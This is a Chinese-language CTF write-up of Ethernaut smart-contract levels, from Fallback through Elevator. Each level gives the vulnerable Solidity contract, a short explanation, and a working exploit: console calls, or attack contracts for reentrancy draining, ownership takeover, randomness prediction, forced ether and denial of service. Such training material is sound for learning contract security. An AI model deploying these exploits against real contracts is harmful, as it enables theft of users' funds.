---
comment: True
counter: True
---

# Ethernaut

!!! abstract
    感觉这个系列是Blockchain比较有名的新手题目系列，希望能借此学会一些Blockchain基础技能，不至于比赛的时候无脑跳过。
    [题目链接](https://ethernaut.openzeppelin.com)

> 非常糟心的是没有找到足够的faucet获取足够的eth来支付gas，没想到居然卡在了这一步。在Goerli扩展网络下，找到一个[水龙头](https://bigoerlifaucet.com/)，每天可以有0.005，虽然很少，但是存一存勉强够用。（GAS费好贵，都快0.01了）
> 后来发现这个[手动挖](https://goerli-faucet.pk910.de/)，直接挖了一些，感觉这样足够了。

## Hello Ethernaut

跳过了，不想浪费好不容易凑的Gas费，就是一些基本操作的教学。

## Fallback

??? question "题目合约"
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;

    contract Fallback {

        mapping(address => uint) public contributions;
        address public owner;

        constructor() {
            owner = msg.sender;
            contributions[msg.sender] = 1000 * (1 ether);
        }

        modifier onlyOwner {
                require(
                    msg.sender == owner,
                    "caller is not the owner"
                );
                _;
            }

        function contribute() public payable {
            require(msg.value < 0.001 ether);
            contributions[msg.sender] += msg.value;
            if(contributions[msg.sender] > contributions[owner]) {
                owner = msg.sender;
            }
        }

        function getContribution() public view returns (uint) {
            return contributions[msg.sender];
        }

        function withdraw() public onlyOwner {
            payable(owner).transfer(address(this).balance);
        }

        receive() external payable {
            require(msg.value > 0 && contributions[msg.sender] > 0);
            owner = msg.sender;
        }
    }
    ```

题目要求，改变合约所有者为玩家，并取出所有的余额。

根据合约代码，要求玩家的contribution值大于原合约拥有者时移交所有权，但是这是难以实现的，因此需要利用receive函数，这个函数在合约接收交易时就会执行，因此我们只需要先使玩家contribution大于0，并向合约发送大于0的交易即可完成本题。

```js
await contract.contribute({value:1})
await contract.sendTransaction({value:1})
await contract.withdraw()
```

## Fallout

??? question "题目合约"
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;

    import 'openzeppelin-contracts-06/math/SafeMath.sol';

    contract Fallout {
    
        using SafeMath for uint256;
        mapping (address => uint) allocations;
        address payable public owner;


        /* constructor */
        function Fal1out() public payable {
            owner = msg.sender;
            allocations[owner] = msg.value;
        }

        modifier onlyOwner {
                    require(
                        msg.sender == owner,
                        "caller is not the owner"
                    );
                    _;
                }

        function allocate() public payable {
            allocations[msg.sender] = allocations[msg.sender].add(msg.value);
        }

        function sendAllocation(address payable allocator) public {
            require(allocations[allocator] > 0);
            allocator.transfer(allocations[allocator]);
        }

        function collectAllocations() public onlyOwner {
            msg.sender.transfer(address(this).balance);
        }

        function allocatorBalance(address allocator) public view returns (uint) {
            return allocations[allocator];
        }
    }
    ```

可以发现合约的constructor函数是Fal1out，因此直接调用`#!js contract.Fal1out()`即可完成本题

## Coinflip

??? question "题目合约"
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;

    contract CoinFlip {

        uint256 public consecutiveWins;
        uint256 lastHash;
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

        constructor() {
            consecutiveWins = 0;
        }

        function flip(bool _guess) public returns (bool) {
            uint256 blockValue = uint256(blockhash(block.number - 1));

            if (lastHash == blockValue) {
                revert();
            }

            lastHash = blockValue;
            uint256 coinFlip = blockValue / FACTOR;
            bool side = coinFlip == 1 ? true : false;

            if (side == _guess) {
                consecutiveWins++;
            return true;
            } else {
                consecutiveWins = 0;
                return false;
            }
        }
    }
    ```

这道题让我学习了如何通过Remix部署合约并执行相应的合约函数，本题需要部署一个攻击合约，因为题目合约中要求`lastHash != blockValue`，安照题目要求执行10次即可。

???+ done "exp"
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;

    contract CoinFlip {

        uint256 public consecutiveWins;
        uint256 lastHash;
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

        constructor() {
            consecutiveWins = 0;
        }

        function flip(bool _guess) public returns (bool) {
            uint256 blockValue = uint256(blockhash(block.number - 1));

            if (lastHash == blockValue) {
                revert();
            }

            lastHash = blockValue;
            uint256 coinFlip = blockValue / FACTOR;
            bool side = coinFlip == 1 ? true : false;

            if (side == _guess) {
                consecutiveWins++;
                return true;
            } else {
                consecutiveWins = 0;
                return false;
            }
        }
    }

    contract hack {
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;  
        CoinFlip c = CoinFlip(0x2Ee20b7C14d2c7376F8E04cA175D840FF0644B85);

        function exp() public{
            uint256 blockValue = uint256(blockhash(block.number - 1));
            uint256 coinFlip = blockValue / FACTOR;
            bool side = coinFlip == 1 ? true : false;
            c.flip(side);
        }
    }
    ```

## Telephone

??? question "题目合约"
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;

    contract Telephone {

        address public owner;

        constructor() {
            owner = msg.sender;
        }

        function changeOwner(address _owner) public {
            if (tx.origin != msg.sender) {
                owner = _owner;
            }
        }
    }
    ```

这里的一个知识点就是tx.origin是整个交易的最原始发送者，而msg.sender则是当前调用者：

- tx.origin：交易发送方，是整个交易最开始的地址
- msg.sender：消息发送方，是当前调用的调用方地址

于是，只要部署一个合约来调用changeOwner方法即可，合约编写很简单，这里就不放了。

## Token

??? question "题目合约"
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;

    contract Token {

        mapping(address => uint) balances;
        uint public totalSupply;

        constructor(uint _initialSupply) public {
            balances[msg.sender] = totalSupply = _initialSupply;
        }

        function transfer(address _to, uint _value) public returns (bool) {
            require(balances[msg.sender] - _value >= 0);
            balances[msg.sender] -= _value;
            balances[_to] += _value;
            return true;
        }

        function balanceOf(address _owner) public view returns (uint balance) {
            return balances[_owner];
        }
    }
    ```

这里考察的一个知识点是uint溢出，溢出后就能获得很大的数值了，所以直接使用`#!js await contract.transfer(contract.address, 21)`即可完成本题。

## Delegation

??? question "题目合约"
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;

    contract Delegate {

        address public owner;

        constructor(address _owner) {
            owner = _owner;
        }

        function pwn() public {
            owner = msg.sender;
        }
    }

    contract Delegation {

        address public owner;
        Delegate delegate;

        constructor(address _delegateAddress) {
            delegate = Delegate(_delegateAddress);
            owner = msg.sender;
        }

        fallback() external {
            (bool result,) = address(delegate).delegatecall(msg.data);
            if (result) {
                this;
            }
        }
    }
    ```

这道题的考点是delegatecall，这个函数接收的是经过`#!solidity abi.encodeWithSignature`后的函数，查询文档可知只要取函数名sha3后的前4个字节即可。

```js 
> web3.utils.sha3("pwn()")
'0xdd365b8b15d5d78ec041b851b68c8b985bee78bee0b87c4acf261024d8beabab'
> contract.sendTransaction({data: "0xdd365b8b"})
```

## Force

虽然无法向合约转账，但是在合约自毁时，可以强制奖余额转到指定地址，因此只需先创建一个合约，向其转账后，再自毁合约即可。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Exploit {
    constructor() public payable {}  // 初始要接收 value 来创建合约
    function exp(address challenge) public {
        // 需要先强制转换为 payable
        address payable challenge = payable(address(challenge));
        selfdestruct(challenge);
    }
}
```

## Vault

??? question "题目合约"
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;

    contract Vault {
        bool public locked;
        bytes32 private password;

        constructor(bytes32 _password) public {
            locked = true;
            password = _password;
        }

        function unlock(bytes32 _password) public {
            if (password == _password) {
                locked = false;
            }
        }
    }
    ```

由于区块链上的一切都是公开的，因此private变量也是可以看到的，下面就用了Tony老师的解题代码。

```js
> await web3.eth.getStorageAt(instance, 1) // 0 为 locked 的位置，1 为 password
'0x412076657279207374726f6e67207365637265742070617373776f7264203a29'
> web3.utils.toAscii("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")
'A very strong secret password :)'
> await contract.unlock("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")
// 参数是 bytes32，所以不能直接传字符串进去
```

## King

??? question "题目合约"
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;

    contract King {
        address payable king;
        uint public prize;
        address payable public owner;

        constructor() public payable {
            owner = msg.sender;  
            king = msg.sender;
            prize = msg.value;
        }

        receive() external payable {
            require(msg.value >= prize || msg.sender == owner);
            king.transfer(msg.value);
            king = msg.sender;
            prize = msg.value;
        }

        function _king() public view returns (address payable) {
            return king;
        }
    }
    ```

在更换king的时候，会将余额转到上一任king，只要选择不接受，即可不完成换任，这里可以使用revert。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Exploit {
    constructor(address challenge) public payable {
        challenge.call{value:msg.value}("");
    }
    fallback() external {
        revert();
    }
}
```

只要转的钱比prize(1300889614901161 wei)多就可以了。

## Re-entrancy

??? question "题目合约"
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.12;

    import 'openzeppelin-contracts-06/math/SafeMath.sol';

    contract Reentrance {
    
        using SafeMath for uint256;
        mapping(address => uint) public balances;

        function donate(address _to) public payable {
            balances[_to] = balances[_to].add(msg.value);
        }

        function balanceOf(address _who) public view returns (uint balance) {
            return balances[_who];
        }

        function withdraw(uint _amount) public {
            if(balances[msg.sender] >= _amount) {
                (bool result,) = msg.sender.call{value:_amount}("");
                if(result) {
                    _amount;
                }
                balances[msg.sender] -= _amount;
            }
        }

        receive() external payable {}
    }
    ```

这题考察重入攻击，因为withdraw是先转账，所以可以使用receive或fallback一直withdraw。刚开始卡了很久，后来发现是改了合约代码后忘记重新编译了，浪费了好多gas费qaq。

???+ done "exp"
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;

    /* code of Reentrance */

    contract Exploit {
        Reentrance challenge;
        constructor(address payable addr) public payable {
            challenge = Reentrance(addr);
        }
        function exp() public {
            challenge.withdraw(0.001 ether);
        }
        fallback() external payable {
            if (address(challenge).balance >= 0) {
                challenge.withdraw(0.001 ether);
            }
        }
    }
    ```

执行合约前，需要先donate保证合约可以取钱。`#!js contract.donate.sendTransaction(<exp contract addr>, {value: toWei("0.001")})` 

## Elevator

??? question "题目合约"
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;

    interface Building {
        function isLastFloor(uint) external returns (bool);
    }


    contract Elevator {
        bool public top;
        uint public floor;

        function goTo(uint _floor) public {
            Building building = Building(msg.sender);

            if (! building.isLastFloor(_floor)) {
                floor = _floor;
                top = building.isLastFloor(floor);
            }
        }
    }
    ```

这题学习了solidity中接口的一些用法，根据题目详解也了解到了view和pure函数修改器的作用，可以防止状态被篡改，但是即使这样，也可以构造一个不同输入得到不同输出的函数解出本题。

???+ done "exp"
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;

    /* code of Elevator */

    contract Exploit {
        Elevator elevator;
        bool top = true;
        constructor(address challenge) public {
            elevator = Elevator(challenge);
        }
        function isLastFloor(uint) public returns (bool) {
            top = !top;  // 调用一次就改一次返回值
            return top;
        }
        function exp() public {
            elevator.goTo(1);
        }
    }
    ```

## Privacy